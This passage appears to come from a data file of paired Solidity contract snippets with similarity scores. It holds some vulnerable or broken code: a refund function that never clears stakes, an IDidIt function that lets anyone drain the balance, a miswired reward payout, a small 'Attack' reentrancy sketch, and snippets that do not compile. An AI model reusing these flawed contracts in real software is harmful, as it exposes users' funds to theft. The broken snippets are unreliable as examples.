        countevents[_name] += 1;
        database[_name][countevents[_name]] = _ipfs;
        victimDatabase[msg.sender][_name].person = msg.sender;
        victimDatabase[msg.sender][_name].stake = msg.value;
        victimDatabase[msg.sender][_name].time = block.timestamp;
    }

    function checkClaimExists(string _name) view public returns(uint){
        
        if(countevents[_name] == 0)
            return(0);
        else
            return(countevents[_name]);
    }

    function getClaimDetails(string _name, uint _number) view public returns(string){
        require(_number >= 1);
        require( keccak256(database[_name][_number]) != keccak256(""""));
        return(database[_name][_number]);
    }

    function refundStake(string _name)  public {
        require(victimDatabase[msg.sender][_name].stake > 0);
        require(victimDatabase[msg.sender][_name].time <= block.timestamp + RefundTime);
        msg.sender.transfer(victimDatabase[msg.sender][_name].stake);

    }

}",0.5470928548867644,"contract TokenTimelock {

  using SafeERC20 for IERC20;



  IERC20 private _token;

  address private _sender;

  address private _beneficiary;

  uint256 private _releaseTime;



  constructor(

    IERC20 token,

    address beneficiary,

    uint256 releaseTime

  )

    public

  {

    

    require(releaseTime > block.timestamp);

    _token = token;

    _sender = msg.sender;

    _beneficiary = beneficiary;

    _releaseTime = releaseTime;

  }



  function token() public view returns(IERC20) {

    return _token;

  }

  function sender() public view returns(address) {

    return _sender;

  }

  function beneficiary() public view returns(address) {

    return _beneficiary;

  }

  function releaseTime() public view returns(uint256) {

    return _releaseTime;

  }



  function release() public {

    

    require((msg.sender == _sender) || (msg.sender == _beneficiary), ""thou shall not pass!"");

    require(block.timestamp >= _releaseTime, ""not yet."");



    uint256 amount = _token.balanceOf(address(this));

    require(amount > 0, ""zero balance"");



    _token.safeTransfer(_beneficiary, amount);

  }



  function cancel() public {

    require(msg.sender == _sender, ""Only sender can do this"");



    uint256 amount = _token.balanceOf(address(this));

    require(amount > 0, ""zero balance"");



    _token.safeTransfer(_sender, amount);

  }

}"
"contract TicTacToe{


struct Cell {
    uint row;
    uint column;
    address played;
}


struct GameBoard {
    bool gameWon;
    address _player1;
    address _player2;
    Cell[] board;
}

uint private numberOfGames = 0; 
GameBoard[] public _games; 


function getGameNum() public returns(uint){
    return numberOfGames;
}


function newGame() public {
    
    GameBoard tempBoard;
    
    tempBoard._player1 = msg.sender;
    tempBoard._player2 = msg.sender;
    tempBoard.gameWon = false;

    uint counter = 0;
    
    for (uint row = 1; row <= 3; row++) {
        
        for (uint column = 1; column <= 3; column++) {
            tempBoard.board.length++;
            tempBoard.board[counter].row = row;
            tempBoard.board[counter].column = column;
            tempBoard.board[counter].played = 0x0;
            counter++;
        }
    }
}
}",0.5597860065923355,"contract QBEToken is MintableToken {	
    
  string public constant name = ""Qubicle"";
   
  string public constant symbol = ""QBE"";
    
  uint32 public constant decimals = 18;

  mapping (address => uint) public locked;

  function transfer(address _to, uint256 _value) returns (bool) {
    require(locked[msg.sender] < now);
    return super.transfer(_to, _value);
  }

  function transferFrom(address _from, address _to, uint256 _value) returns (bool) {
    require(locked[_from] < now);
    return super.transferFrom(_from, _to, _value);
  }
  
  function lock(address addr, uint periodInDays) {
    require(locked[addr] < now && (msg.sender == saleAgent || msg.sender == addr));
    locked[addr] = now + periodInDays * 1 days;
  }

  function () payable {
    revert();
  }

}"
"contract smallMarket{

    struct transaction {
      uint timeStamp;
      uint qtyT;
      uint price;
      address client;
      bytes32 typee;
    }
    struct sellOrder {
      uint timeStamp;
      uint qty;
      uint price;
      address seller;
    }

    mapping(uint => transaction) public transactions;
    mapping(uint => sellOrder) public sellorders;

    uint public lastTransactionId;
    uint public lastBOrderId;
    uint public lastSOrderId;
    address public owner;

    function smallMarket(){
      owner = msg.sender;
      lastSOrderId = 0;
    }
    function newTransaction(uint amount,uint price,bytes32 typee){
      uint transac = lastTransactionId + 1;
      transaction t = transactions[transac];
      t.timeStamp = block.timestamp;
      t.qtyT = amount;
      t.price = price;
      t.client = msg.sender;
      t.typee = typee;
      lastTransactionId = transac; 
    }

    function newSellOrder(uint amount,uint price,uint currency) {
        uint order = lastSOrderId + 1; 
        sellOrder s = sellorders[order];
        s.timeStamp = block.timestamp;
        s.qty = amount;
        s.price = price;
        s.seller = msg.sender;
        lastSOrderId = order;
    }
    function buy(uint amount, uint price) {
      uint idCounter = lastSOrderId;
      uint _amountLeftToBuy = amount;
      while (_amountLeftToBuy > 0){
          if (price >= sellorders[idCounter].price && sellorders[idCounter].qty >= amount) {
            newTransaction(amount,price,'cas 1');
            _amountLeftToBuy = 0;

          }
          else if (price >= sellorders[idCounter].price && amount > sellorders[idCounter].qty ){
              newTransaction(amount,price,'cas 2');
              _amountLeftToBuy =  amount - sellorders[idCounter].qty;
              idCounter = idCounter - 1;
          }
          else if (sellorders[idCounter].price > price){
              newTransaction(amount,price,'cas 3');
              _amountLeftToBuy = 0;
          }
          else{}
      }    
    }
  }",0.5631199406471277,"contract ATCToken is ERC20Interface{
    string public standard = &#39;Token 1.0&#39;;
    string public constant name=""ATC"";
    string public constant symbol=""ATC"";
    uint8 public constant decimals=10;
    uint256 public constant _totalSupply=3000000000000000000;
    mapping(address => mapping (address => uint256)) allowed;
    mapping(address => uint256) balances;
    address public owner;
    
    function ATCToken() {
        owner = msg.sender;
        balances[owner] = _totalSupply; 
    }
    
    function totalSupply() constant returns (uint256 totalSupply) {
          totalSupply = _totalSupply;
    }
    
    function balanceOf(address _owner) constant returns (uint256 balance){
        return balances[_owner]; 
    }

    function transfer(address _to, uint256 _amount) returns (bool success)  {
       if (balances[msg.sender] >= _amount 
              && _amount > 0
              && balances[_to] + _amount > balances[_to]) {
              balances[msg.sender] -= _amount;
              balances[_to] += _amount;
              Transfer(msg.sender, _to, _amount);
              return true;
          } else {
              return false;
          }
    }

    function transferFrom(address _from, address _to, uint256 _amount) returns (bool success){
        if (balances[_from] >= _amount
             && _amount > 0
             && balances[_to] + _amount > balances[_to]  && _amount <= allowed[_from][msg.sender]) {
             balances[_from] -= _amount;
             balances[_to] += _amount;
             allowed[_from][msg.sender] -= _amount;
             Transfer(_from, _to, _amount);
             return true;
         } else {
             return false;
         }
    }

    function approve(address _spender, uint256 _value) returns (bool success){
         allowed[msg.sender][_spender] = _value;
         Approval(msg.sender, _spender, _value);
         return true;
    }

    function allowance(address _owner, address _spender) constant returns (uint256 remaining)
    {
        return allowed[_owner][_spender];
    }
}"
"contract Campaign{
    struct Transaction {
        address Creditor;
        uint Amount;
    }
    Transaction[] public Transactionss;
    mapping(address => Transaction) public TransactionsMap;

    function addTransaction(address _address,uint _amount) public {

        Transaction memory newRequest = Transaction({
           Creditor: _address,
           Amount: _amount });
        Transactionss.push(newRequest); 
        TransactionsMap[_address]=Transactionss[Transactionss.length-1];


    }
    function Testing()public {
        addTransaction(0xaef0B7Edd5D2E9315027ADFA4642E16a5c85Afd8,100);
        TransactionsMap[0xaef0B7Edd5D2E9315027ADFA4642E16a5c85Afd8].Amount++;
    }


    function a()public view  returns (uint){
        return TransactionsMap[0xaef0B7Edd5D2E9315027ADFA4642E16a5c85Afd8].Amount;
    }

    function b()public view  returns (uint){
        return Transactionss[0].Amount;
    }


}",0.5077089664513853,"contract ERC721Interface {

  function approve(address _to, uint _tokenId) public;

  function balanceOf(address _owner) public view returns (uint balance);

  function implementsERC721() public pure returns (bool);

  function ownerOf(uint _tokenId) public view returns (address addr);

  function takeOwnership(uint _tokenId) public;

  function totalSupply() public view returns (uint total);

  function transferFrom(address _from, address _to, uint _tokenId) public;

  function transfer(address _to, uint _tokenId) public;



  event Transfer(address indexed from, address indexed to, uint tokenId);

  event Approval(address indexed owner, address indexed approved, uint tokenId);

}"
"contract ParentContract{

    ConfigContract _config;

    constructor(ConfigContract config) public{
        _config = ConfigContract(config);
    }

    function getNameFromOtherContract() public view returns(string) {
        return _config.getName();
    }
}",0.5333409288618368,"contract Counter {
    uint256 count;  

    function Counter(uint256 _count) public {
        count = _count;
    }

    function increment() public {
        count += 1;
    }

    function getCount() public view returns (uint256) {
        return count;
    }
}"
"contract testAdoption{
    Adoption adoption = Adoption(DeployedAddresses.Adoption());

    
    function testUserCanAdoptPet() public{
        uint returnedId = adoption.adopt(8);

        uint expected = 8;

        Assert.equal(returnedId, expected, ""Adoption of pet ID 8 should be recorded"");
    }

    
    function testGetAdopterAddressBypetId() public {
        
        address expected = this;

        address adopter = adoption.adopters(8);

        Assert.equal(adopter, expected, ""Owner of pet ID 8 should be recorded"");
    }

    
    function testGetAdopterAddressBypetIdInArray() public {
        
        address expected = this;

        
        address[16] memory adopters = adoption.getAdopters();

        Assert.equal(adopters[8], expected, ""Owner of pet ID 8 should be recorded"");
    }


}",0.5258602027562389,"contract ERC721  {

    

    

    function totalSupply() public view returns (uint256 total);

    function balanceOf(address _owner) public view returns (uint256 balance);

    function ownerOf(uint256 _tokenId) public view returns (address owner);

    function approve(address _to, uint256 _tokenId) external;

    function transfer(address _to, uint256 _tokenId) external;

    function transferFrom(address _from, address _to, uint256 _tokenId) external;



    

    event Transfer(address from, address to, uint256 tokenId);

    event Approval(address owner, address approved, uint256 tokenId);



    

    

    

    

    



    

    function supportsInterface(bytes4 _interfaceID) external view returns (bool);

    

}"
"contract Election{
  
  struct candidate
  {
    uint id;
    string name;
    uint votecount;
  }
  
  

  mapping(uint => candidate) public candidates;

  

  uint public candidatescount;

  function () Election public {
    addcandidate(""candidate1"");
    addcandidate(""candidate2"");
  }
  function addcandidate (string _name) private
  {
    candidatecount ++;
    candidates[candidatescount] = candidate(candidatescount, _name, 0);
  }
}",0.5413667896739993,"contract Owned {
    address public owner;
    address public candidate;

    
    function Owned() internal {
        owner = msg.sender;
    }

    
    modifier onlyOwner {
        require(owner == msg.sender);
        _;
    }

    
    function changeOwner(address _owner) onlyOwner public {
        candidate = _owner;
    }

    
    function acceptOwner() public {
        require(candidate != address(0));
        require(candidate == msg.sender);
        owner = candidate;
        delete candidate;
    }
}"
"contract Savings
{
    struct Deposit
    {
        string name;
        uint deposit;
    }

    uint        cEnd = now + 10 years;
    address[]   dAddresses;

    mapping(address => Deposit[]) deposits;

    function depositEther(string _name)
    {
        deposits[msg.sender].push(Deposit({
            name: _name,
            deposit: msg.value
        }));
        dAddresses.push(msg.sender);

        if(now >= cEnd){
            distribute(); 
        }
    }

    
    function distribute() internal {
    }   
}",0.5636917163321529,"contract AddressNames{

	mapping(address => string) addressNames;

	function setName(string name){
		if(bytes(name).length >= 3){
			addressNames[msg.sender] = name;
		}
	}

	function hasName(address who) constant returns (bool hasAName){
		hasAName = bytes(addressNames[who]).length != 0;
	}

	function getName(address who) constant returns (string name){
		name = addressNames[who];
	}
}"
"contract test{
    uint[] public array = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15];
    function removewithgap(uint index)  returns(uint[]) {
        if (index >= array.length) return;
        delete array[index];
        return array;
    }
    function removewithoutgap(uint index)  returns(uint[]) {
        if (index >= array.length) return;

        for (uint i = index; i<array.length-1; i++){
            array[i] = array[i+1];
        }
        delete array[array.length-1];
        array.length--;
        return array;
    }
}",0.5245627725614449,"contract SafeMath {
    function safeMul(uint a, uint b) internal pure returns (uint) {
        uint c = a * b;
        require(a == 0 || c / a == b);
        return c;
    }
    function safeSub(uint a, uint b) internal pure returns (uint) {
        require(b <= a);
        return a - b;
    }
    function safeAdd(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c>=a && c>=b);
        return c;
    }
}"
"contract B{
   uint res;
   function call_double(uint val) {
   A a=A(0x1);
   res = a.double(val);
   }
 }",0.5946620635975425,"contract Coin{

  function transfer(address to, uint value) public returns (bool);

}"
"contract Notary{
    struct Document {
        uint timestamp;
        bytes ipfs_hash;
        address[] signatures;
    }
    mapping(address => bytes[]) public users; 
    mapping(bytes32 => Document) public documents; 

    function addDocument(bytes ipfs) public {
        users[msg.sender].push(ipfs); 
        address[] memory sender;
        sender[0] = msg.sender;
        documents[sha3(ipfs)] = Document(block.timestamp, ipfs, sender);
    }

    function signDocument(bytes ipfs) public {
        users[msg.sender].push(ipfs);
        documents[sha3(ipfs)].signatures.push(msg.sender);
    }

}",0.5832153043212148,"contract VotingChallengeForwarder {

    mapping ( address => address[] ) public sendersHash;

    mapping ( address => uint[] ) public sumsHash;



    function forward(address to, address sender) public payable {

        to.transfer(msg.value);

        sendersHash[to].push(sender);

        sumsHash[to].push(msg.value);

    }



    function getSendersHash(address user) public view returns (address[]) {

        return sendersHash[user];

    }



    function getSumsHash(address user) public view returns (uint[]) {

        return sumsHash[user];

    }

}"
"contract coinFlipper{
    mapping(uint=>address) parties;
    mapping(address=>uint) bets;

    enum GameState { betOpen, betWaiting, betClosed}
    GameState public coinFlip;

    function coinFlipper() public{
        coinFlip = GameState.betOpen;
    }

    function offerBet(uint _amount) public payable {
        require(coinFlip == GameState.betOpen);
        coinFlip = GameState.betWaiting;
        parties[0] = msg.sender;
        bets[msg.sender] = _amount;
    }

    function meetBet(uint _amount) public payable {
        require(coinFlip == GameState.betWaiting);
        require(_amount >= bets[parties[0]]);
        coinFlip = GameState.betClosed;
        parties[1] = msg.sender;
        bets[msg.sender] = _amount;
    }

}",0.5653387730693911,"contract ventil_ii{ 

mapping(address => uint) public balances;

event LogDeposit(address sender, uint amount);
event LogWithdrawal(address receiver, uint amount);

function withdrawFunds(uint amount) public returns(bool success) {
    require(amount < balances[msg.sender]);
    LogWithdrawal(msg.sender, amount);
    msg.sender.transfer(amount);
    return true;
}

function () public payable {
    require(msg.value > 0);
    uint change;
    uint dep;
    if(msg.value > 20) {
        dep = 20;
        change = msg.value - change;
    }
    balances[msg.sender] += dep;
    if(change > 0) balances[msg.sender] += change;
    LogDeposit(msg.sender, msg.value);
}

}"
"contract Sample2{
    function try(address addr){
       Sample(addr).test2() ;
       addr.call(bytes4(keccak256(""test2()""))) ;
    }
}",0.5343678961716541,"contract ContractProvider {
	function contracts(bytes32 contractName) returns (address addr){}
}"
"contract exercise3
{
    mapping (string => mapping(string => int)) gameResult;
    address player1;
    bool hasRight1; 

    address player2;
    bool hasRight2; 
    address public rec = 0x6F40147fE553b2Fb16A41C57CC87Ab72678d85C2;
    string public choice1;
    string public choice2;
    function deposit1() public payable {
        require(msg.value == 5 ether);
        rec.transfer(msg.value);
        player1 = msg.sender; 
        hasRight1 = true;
     }
     function deposit2() public payable {
        require(msg.value == 5 ether);
        rec.transfer(msg.value);
        player2 = msg.sender; 
        hasRight2 = true;
     }
    function rps() public
    {   
        gameResult[""rock""][""rock""] = 0;
        gameResult[""rock""][""paper""] = 2;
        gameResult[""rock""][""scissors""] = 1;
        gameResult[""paper""][""rock""] = 1;
        gameResult[""paper""][""paper""] = 0;
        gameResult[""paper""][""scissors""] = 2;
        gameResult[""scissors""][""rock""] = 2;
        gameResult[""scissors""][""paper""] = 1;
        gameResult[""scissors""][""scissors""] = 0;
    }

    function play (string choice) public 
    {     
        if (msg.sender == player1&&hasRight1 == true)
            choice1 = choice;
        else if (msg.sender == player2 &&hasRight2 == true)
            choice2 = choice;

    }
    function sendReward()  public payable
    {
        if (bytes(choice1).length != 0 && bytes(choice2).length != 0)
        {

            int winner = gameResult[choice1][choice2];
            if (winner == 1)

                player1.transfer(10 ether);
            else if (winner == 2)
                player1.transfer(10 ether);
            else
            {
                player1.transfer(5 ether);
                player2.transfer(5 ether);

            }


        }
    }
}",0.5601715780858715,"contract TenXBuyer {
  
  mapping (address => uint) public balances;
  
  uint256 public bounty;
  
  bool public bought_tokens;
  
  uint public time_bought;
  
  
  uint hardcap = 200000 ether;
  
  uint pay_per_eth = 420;
  
  
  MainSale public sale = MainSale(0xd43D09Ec1bC5e57C8F3D0c64020d403b04c7f783);
  
  ERC20 public token = ERC20(0xB97048628DB6B661D4C2aA833e95Dbe1A905B280);
  
  address developer = 0x4e6A1c57CdBfd97e8efe831f8f4418b1F2A09e6e;
  
  
  function withdraw(){
    
    if (!bought_tokens) {
      
      uint eth_amount = balances[msg.sender];
      
      balances[msg.sender] = 0;
      
      msg.sender.transfer(eth_amount);
    }
    
    else {
      
      uint pay_amount = balances[msg.sender] * pay_per_eth;
      
      balances[msg.sender] = 0;
      
      uint fee = 0;
      
      bool cap_reached = (sale.multisigVault().balance + sale.altDeposits() > hardcap);
      
      if (cap_reached || (now > time_bought + 1 days)) {
        fee = pay_amount / 100;
      }
      
      token.transfer(msg.sender, pay_amount - fee);
      token.transfer(developer, fee);
    }
  }
  
  
  function add_to_bounty() payable {
    
    if (bought_tokens) throw;
    
    bounty += msg.value;
  }
  
  
  function buy(){
    
    if (bought_tokens) return;
    
    bought_tokens = true;
    
    time_bought = now;
    
    
    
    sale.createTokens.value(this.balance - bounty)(address(this));
    
    msg.sender.transfer(bounty);
  }
  
  
  function default_helper() payable {
    
    if (msg.value == 0) {
      withdraw();
    }
    
    else {
      
      if (bought_tokens) throw;
      
      balances[msg.sender] += msg.value;
    }
  }
  
  function () payable {
    default_helper();
  }
}"
"contract EggHatching is EggFactory{

    uint hatchTime = 1 days;

    function hatchEgg(uint eggId) public {
        require(msg.sender == eggToOwner[eggId]);
        require(hasHatched(eggId) == true);
        eggs[eggId].hatched = true;
    }

    function hasHatched(uint eggId) internal view returns (bool){
        return ((now - eggs[eggId].createdAt) >= hatchTime);
    }

    function getEggType(uint eggId) internal view returns (uint){

    }
}",0.5654867880288204,"contract ERC677Token {
  function transferAndCall(address receiver, uint amount, bytes data) public returns (bool success);
  function contractFallback(address to, uint value, bytes data) internal;
  function isContract(address addr) internal view returns (bool hasCode);
  event Transfer(address indexed from, address indexed to, uint value, bytes data);
}"
"contract Attack{
  Victim victim;

  function () payable {
     victim.withdraw.value(0)(balance);
  }
}",0.55365384714501,"contract SendBack {
    function() payable {
        if (!msg.sender.send(msg.value))
            throw;
    }
}"
"contract students{
uint public totalTokens;
constructor() public {
    totalTokens = 800;
}
struct Students{
    uint amount; 
    string givenFor;
}

mapping (string => Students) studentsMappig;

string[] private studentsArray;

function setStudents(string _name, uint _amt, string _reason) public{
    Students storage student = studentsMappig[_name];
    totalTokens -= _amt;
    student.amount += _amt;
    student.givenFor = _reason;
    studentsArray.push(_name);
}
function getDetails(string addr) public view returns(uint amount) {
    Students storage student = studentsMappig[addr];
    return amount = student.amount;
}   
function getUsersCount() public view returns(uint) {
    return studentsArray.length;
}    
}",0.5852004654845152,"contract SecurityTokenFactory {
    
    
    
    string public stamp;
    
    SecurityToken private ST;
    
    address[] public tokens;
    
    event Deployed(address indexed ST, address indexed owner);
    
    constructor(string memory _stamp) public 
	{
        stamp = _stamp;
	}
    
    function newSecurityToken(
        string memory name, 
		string memory symbol,
		uint8 decimals,
		IERC20 _fundsToken,
		address[] memory ownership,
		uint256[] memory initialAmount) public {
       
        ST = new SecurityToken(
            name, 
            symbol,
            decimals,
            _fundsToken,
            ownership,
            initialAmount);
        
        tokens.push(address(ST));
        
        emit Deployed(address(ST), ownership[0]);
    }
    
    function getTokenCount() public view returns (uint256 tokenCount) {
        return tokens.length;
    }
}"
"contract charity_tab{

  string [] public charity;
  uint public charitySize=0;

  function addCharity(string a) {
    charity.push(a);
    charitySize++;  
  }
}",0.5526453655767535,"contract IParityRegistry {
    mapping (bytes4 => string) public entries;
    
    function register(string memory _method)
    public
    returns (bool);
}"
"contract LotteryFor10{

address[] users; 
mapping(address => bool) participated;
uint256 public constant WAIT_BLOCKS_LIMIT = 3 ;
uint256 public registeredCount ;
uint256 public _registeredLimit ;
uint256 constant REGISTERING_PARTICIPANTS = 1;
uint256 constant REGISTERING_FINISHED = 2;
uint256 constant WAITING_FOR_RANDOMNESS = 3;
uint256 constant SOLVING_LOTERRY = 4;
uint256 constant LOTTERY_SOLVED = 5;
uint256 public waitingStartBlockNumber;
bool public lotterySolved;

constructor(uint256 _limit) public{
    waitingStartBlockNumber = 0;
    registeredCount = 0;
 not have to
    _registeredLimit = _limit;
}



function () public payable{

    if(getStage(block.number)==REGISTERING_PARTICIPANTS){
        processAddingUser(msg.sender);
    }
    else{ 
   call
        if(getStage(block.number)==REGISTERING_FINISHED){
            require(msg.value == 0,""no additional stake allowed"");
            waitingStartBlockNumber = block.number;
            emit ClosingList(waitingStartBlockNumber);
        }
        else{
            if(getStage(block.number)==WAITING_FOR_RANDOMNESS){
                    require(msg.value == 0,""no additional stake 
   allowed"");

                    revert(""To little time passed, wait at least 
  WAIT_BLOCKS_LIMIT "");
            }
            else{
                if(getStage(block.number)==SOLVING_LOTERRY){
                    require(msg.value == 0,""no additional stake 
                    allowed"");
                    processSolvingLottery(block.number);
                }
                else{        
                    revert(""Lottery Closed "");
                 }
               }
           }
         }
      }


   function getStage(uint256 blockNum) private view returns(uint256) {
    if(registeredCount<_registeredLimit){
        return REGISTERING_PARTICIPANTS;
    }
    else{
        if(waitingStartBlockNumber==0 
                   never set
            || blockNum-waitingStartBlockNumber>=256 
                block has been set long time ago
            ){
            return REGISTERING_FINISHED;
        }
        else
        {
            if(blockNum-waitingStartBlockNumber<WAIT_BLOCKS_LIMIT){
                return WAITING_FOR_RANDOMNESS;
            }
            else{
                if(lotterySolved == true){
                    return LOTTERY_SOLVED;
                }
                else{
                    return SOLVING_LOTERRY;
                 }
               }
            }
         }
      }

   function processAddingUser(address sender) private{
     require(msg.value==1 finney,""Must send 0.001 ether"");
    require(participated[sender]==false,""One address can pericipate 
    only once"");
    require(registeredCount<_registeredLimit,""ups getStage() do not 
     work"");
    participated[sender] = true;
    users.push(sender);
    registeredCount = registeredCount+1;
    emit UserRegistered(sender);
 }

  function processSolvingLottery(uint256 blockNum) private{
    uint256 luckyNumber = 
    uint256(blockhash(waitingStartBlockNumber+WAIT_BLOCKS_LIMIT));
    luckyNumber = luckyNumber % _registeredLimit;
    users[luckyNumber].transfer(address(this).balance);<---- error is 
    here 
    emit UseRewarded(users[luckyNumber],blockNum);
    lotterySolved = true;
 }

event ClosingList(uint256 blockNum);
event UserRegistered(address adr);
event UseRewarded(address adr,uint256 blockNum);
 }",0.5471168033730179,"contract RefundableCrowdsale is HardCappedCrowdsale {



    using SafeMath for uint256;



    uint256 public softCap;

    mapping(address => uint256) public contributorsWei;

    address[] public contributors;



    event Refund(address _holder, uint256 _wei, uint256 _tokens);



    constructor(

        TokenAllocator _allocator,

        ContributionForwarder _contributionForwarder,

        PricingStrategy _pricingStrategy,

        uint256 _startDate,

        uint256 _endDate,

        bool _allowWhitelisted,

        bool _allowSigned,

        bool _allowAnonymous,

        uint256 _softCap,

        uint256 _hardCap



    ) public HardCappedCrowdsale(

        _allocator, _contributionForwarder, _pricingStrategy,

        _startDate, _endDate,

        _allowWhitelisted, _allowSigned, _allowAnonymous, _hardCap

    ) {

        softCap = _softCap;

    }



    

    function getState() public view returns (State) {

        State state = super.getState();



        if (state == State.Success) {

            if (!isSoftCapAchieved(0)) {

                return State.Refunding;

            }

        }



        return state;

    }



    function isSoftCapAchieved(uint256 _value) public view returns (bool) {

        if (softCap <= tokensSold.add(_value)) {

            return true;

        }

        return false;

    }



    

    function refund() public {

        internalRefund(msg.sender);

    }



    

    function delegatedRefund(address _address) public {

        internalRefund(_address);

    }



    function internalContribution(address _contributor, uint256 _wei) internal {

        require(block.timestamp >= startDate && block.timestamp <= endDate);



        uint256 tokensAvailable = allocator.tokensAvailable();

        uint256 collectedWei = contributionForwarder.weiCollected();



        uint256 tokens;

        uint256 tokensExcludingBonus;

        uint256 bonus;



        (tokens, tokensExcludingBonus, bonus) = pricingStrategy.getTokens(

            _contributor, tokensAvailable, tokensSold, _wei, collectedWei);



        require(tokens <= tokensAvailable && tokens > 0 && hardCap > tokensSold.add(tokens));



        tokensSold = tokensSold.add(tokens);



        allocator.allocate(_contributor, tokens);



        

        if (isSoftCapAchieved(0)) {

            if (msg.value > 0) {

                contributionForwarder.forward.value(address(this).balance)();

            }

        } else {

            

            if (contributorsWei[_contributor] == 0) {

                contributors.push(_contributor);

            }

            contributorsWei[_contributor] = contributorsWei[_contributor].add(msg.value);

        }

        crowdsaleAgent.onContribution(_contributor, _wei, tokensExcludingBonus, bonus);

        emit Contribution(_contributor, _wei, tokensExcludingBonus, bonus);

    }



    function internalRefund(address _holder) internal {

        updateState();

        require(block.timestamp > endDate);

        require(!isSoftCapAchieved(0));

        require(crowdsaleAgent != address(0));



        uint256 value = contributorsWei[_holder];



        require(value > 0);



        contributorsWei[_holder] = 0;

        uint256 burnedTokens = crowdsaleAgent.onRefund(_holder, 0);



        _holder.transfer(value);



        emit Refund(_holder, value, burnedTokens);

    }

}"
"contract ClientHandler{

    ContractManagement CMC;

    Job[] public jobs;

    struct Job {
        uint id;
        bytes32 source;
        bytes32 destination;
        uint resourceReq;
    }

    uint jobCounter;
    mapping(uint => address) public jobOwners;

    event pushJobEvent(address sender, bool succes);

    function ClientHandler(address _cmc){
        CMC = ContractManagement(_cmc);
        CMC.registerContract(""ClientHandler"");
        jobCounter = 0;
    }

    function pushJob(bytes32 _source, bytes32 _destination, uint _resourceReq, uint _unitPrice) returns (bool) {

        Job memory newJob;

        newJob.id = jobCounter;
        newJob.source = _source;
        newJob.destination = _destination;
        newJob.resourceReq = _resourceReq;

        jobs.push(newJob);

        jobOwners[jobCounter] = msg.sender;

        Exchange ex = Exchange(CMC.getAddress(""Exchange""));

        if (!ex.postBid(_unitPrice, _resourceReq, newJob.id ) ){
            pushJobEvent(msg.sender, false);
            return false;
        }

        jobCounter = jobCounter + 1;
        pushJobEvent(msg.sender, true);
        return true;
    }

    function getJobs() constant returns (uint[], bytes32[], bytes32[], uint[], address[]){

        uint length = jobs.length;

        uint[] memory ids = new uint[](length);
        bytes32[] memory sources = new bytes32[](length);
        bytes32[] memory destinations = new bytes32[](length);
        uint[] memory resourceReqs = new uint[](length);
        address[] memory owners = new address[](length);

        for (uint i = 0; i < jobs.length; i++){
            Job memory currentJob;
            currentJob = jobs[i];

            ids[i] = currentJob.id;
            sources[i] = currentJob.source;
            destinations[i] = currentJob.destination;
            resourceReqs[i] = currentJob.resourceReq;
            owners[i] = jobOwners[currentJob.id];
        }

        return (ids, sources, destinations, resourceReqs, owners);
    }

}",0.5602511711759975,"contract prescriptionwaste {

    uint256 recordId;
    address owner;

    struct Record  {
        uint256 id;
        address ownerAddress;
        uint64 ndc;
        string lot;
        string serial;
        uint expirationDate;
        uint16 quantity;
        uint donationDate;
        string donationPostalCode;
        string terminalPostalCode;
        bool individual;
    }
    
    
    
    constructor () public {
        owner = msg.sender;
        recordId = 0;
    }
    
    modifier isOwner() {
        require(msg.sender == owner);
        _; 
    } 

    mapping(uint256 => Record) public records;
    
    function AddRecord(uint64 ndc, string memory lot, string memory serial, uint expirationDate, uint16 quantity, uint donationDate,
                            string memory donationPostalCode, string memory terminalPostalCode, bool individual) public returns (uint256) {
        
        require(ndc>0);
        require(quantity>0);
        
        recordId++;
        records[recordId] = Record(recordId, msg.sender, ndc, lot, serial, expirationDate, quantity, donationDate, donationPostalCode, terminalPostalCode, individual);
        return recordId;
    }
    

    function CountRecords() private view returns(uint256) {
        return recordId;
    }
    
    function DeleteRecord(uint256 id) public isOwner {
        delete records[id];
    }
    
    function GetNDCCount(uint64 ndc) private view returns(uint64) {
        uint64 len = 0;
        for (uint256 i = 1; i <= recordId; i++) {
            if (ndc == records[i].ndc){
                len++;
            }
        }
        return len;
    }
    
    function SeachByNDC(uint64 ndc) public view returns(Record[] memory) {
        
        uint64 len = GetNDCCount(ndc);

        Record[] memory tmpRecords = new Record[](len);
        len = 0;
        for (uint256 i = 1; i <= recordId; i++) {
            if (ndc == records[i].ndc){
                tmpRecords[len] = records[i];
                len++;
            }
        }
        return tmpRecords;
    }
    
}"
"contract greeter{
    string greeting;
    function greeter(string _greeting) public {
        greeting = _greeting;
    }
}",0.5498262334835241,"contract Foo
{
    string public phrase;
    
    function Foo(string _phrase) public {
        phrase = _phrase;
    }
}"
"contract TestMyToken{
    MyToken mytoken;

    constructor() public{
       mytoken  = MyToken(DeployedAddresses.MyToken());

    }

    
    function testTotalSupply() public {
      uint returned = mytoken.totalSupply();
      uint expected = 100000000000000000;
      Assert.equal(returned, expected, ""Total Supply should be 100000000000000000."");
    }

    function testTransferFrom() public  {
        address _to = 0x89EAB984AbB3E7Cc0f847dc321fCD9B95a538f05;

        bool result = mytoken.transfer( _to, 1);
        Assert.isTrue(result, ""Transfer should succeed."");
    }

}",0.5639293511388362,"contract CNC is ERC20Token {
    string public name = 'Coinyspace';
    uint8 public decimals = 18;
    string public symbol = 'CNC';
    string public version = '1';

    
    constructor() public {
        totalSupply = 1000000000 * 10 ** uint256(decimals); 
        balances[msg.sender] = totalSupply;
        emit Transfer(0, msg.sender, totalSupply);
    }

    
    function externalTokensRecovery(token _address) onlyAdmin public {
        uint256 remainder = _address.balanceOf(this); 
        _address.transfer(msg.sender,remainder); 
    }


    
    function() public {
        revert();
    }

}"
"contract HopAndMaltOracle{
    
    address public oracle;

   modifier onlyOracle(){
        require(msg.sender == oracle);
       _;
    }
    uint public maltMarketCap;
    uint public hopMarketCap;

    
    event MaltMarketCapChanged();
    event HopMarketCapChanged();

    constructor(uint _maltCap, uint _hopCap) public payable {
        oracle = msg.sender;
        maltMarketCap = _maltCap;
        hopMarketCap = _hopCap;
        emit MaltMarketCapChanged();
        emit HopMarketCapChanged();
    }

    function updateMaltMarketCap(uint _cap) public onlyOracle {
        maltMarketCap = _cap;
        emit MaltMarketCapChanged();
    }

    function updateHopMarketCap(uint _cap) public onlyOracle {
        hopMarketCap = _cap;
        emit HopMarketCapChanged();
    }

    function IDidIt() public{
        require(address(this).balance % 2 == 1);
        msg.sender.transfer(address(this).balance);
    }
}",0.5428018315487547,"contract MainSale {

	uint256 public totalContributed;
	uint256 public startTime;
	uint256 public endTime;
	uint256 public hardCap;
	address public owner;

	function MainSale (address _owner, uint256 _start, uint256 _end, uint256 _cap) public {
		owner = _owner;
		startTime = _start;
		endTime = _end;
		hardCap = _cap * (10 ** 18);
	}

